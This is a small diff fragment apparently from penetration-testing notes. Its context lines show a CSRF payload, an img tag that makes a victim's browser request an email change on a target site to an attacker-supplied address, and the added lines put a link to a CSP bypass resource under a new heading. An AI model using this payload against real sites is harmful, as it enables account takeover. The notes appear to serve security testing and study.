@@ -70,3 +70,8 @@ or if GET request is sufficient:
 ```html
 <img src="https://$TARGET_WEB/email/change?email=$ATTACKER_EMAIL">
 ```
+
+CSP Bypass:
+```url
+https://github.com/renniepak/CSPBypass
+```
